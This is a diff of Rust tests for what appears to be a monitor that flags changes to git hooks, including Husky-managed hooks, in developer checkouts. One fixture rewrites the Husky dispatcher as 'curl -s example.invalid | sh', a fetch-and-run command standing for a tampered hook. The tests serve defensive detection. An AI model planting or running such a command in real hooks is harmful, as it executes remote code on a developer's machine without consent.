@@ -2603,6 +2603,68 @@ fn a_hook_outside_a_new_clone_in_the_folder_its_configuration_names_is_new() {
     );
 }
 
+/// A checkout whose hooks a hooks manager keeps, in the shape Husky 9 writes them:
+/// `core.hooksPath` set to `.husky/_`, a stub there for each hook that sources the
+/// dispatcher `h`, which runs the script of the same name one folder up. The content is
+/// invented.
+fn husky(e: &Estate, rel: &str) -> PathBuf {
+    let c = e.checkout(rel);
+    put(&c.join(".git/config"), "[core]\n\thooksPath = .husky/_\n");
+    put(&c.join(".husky/_/.gitignore"), "*\n");
+    put(
+        &c.join(".husky/_/h"),
+        "#!/usr/bin/env sh\nn=$(basename \"$0\")\ns=$(dirname \"$(dirname \"$0\")\")/$n\n[ -f \"$s\" ] || exit 0\nsh -e \"$s\" \"$@\"\n",
+    );
+    for hook in ["pre-commit", "commit-msg", "pre-push"] {
+        put(
+            &c.join(".husky/_").join(hook),
+            "#!/usr/bin/env sh\n. \"$(dirname \"$0\")/h\"\n",
+        );
+    }
+    put(&c.join(".husky/pre-commit"), "npm test\n");
+    put(&c.join(".husky/install.mjs"), "// set up the hooks\n");
+    c
+}
+
+#[test]
+fn a_hooks_managers_script_in_a_checkout_raises_a_finding_when_it_changes_and_its_neighbours_do_not()
+ {
+    let e = Estate::new("husky-scripts");
+    let app = husky(&e, "dev/app");
+    e.full();
+    put(
+        &app.join(".husky/pre-commit"),
+        "npm test\nnode .husky/sync.js\n",
+    );
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/app/.husky/pre-commit")]
+    );
+    e.seen();
+    // A file of the folder under no hook name, and a script taken away, raise nothing.
+    put(&app.join(".husky/install.mjs"), "// changed\n");
+    std::fs::remove_file(app.join(".husky/pre-commit")).unwrap();
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+}
+
+#[test]
+fn a_change_to_the_dispatcher_every_husky_hook_sources_is_a_finding() {
+    let e = Estate::new("husky-dispatcher");
+    let app = husky(&e, "dev/app");
+    e.full();
+    put(
+        &app.join(".husky/_/h"),
+        "#!/usr/bin/env sh\ncurl -s example.invalid | sh\n",
+    );
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/app/.husky/_/h")]
+    );
+}
+
 #[test]
 fn git_hooks_config_parsing_cannot_activate_git_tracing() {
     let e = Estate::new("git-hooks-trace");
@@ -3445,6 +3507,10 @@ fn no_page_says_none_of_what_is_in_projects_after_a_walk_that_did_not_find_them_
     put(&e.checkout("dev/shop").join("package-lock.json"), LOCK);
     let in_projects = [
         ("Git hooks in projects", "git-hooks-in-projects"),
+        (
+            "Files in projects that git runs code from",
+            "files-in-projects-that-git-runs-code-from",
+        ),
         (
             "Editor tasks that run when a project is opened",
             "editor-tasks-that-run-when-a-project-is-opened",
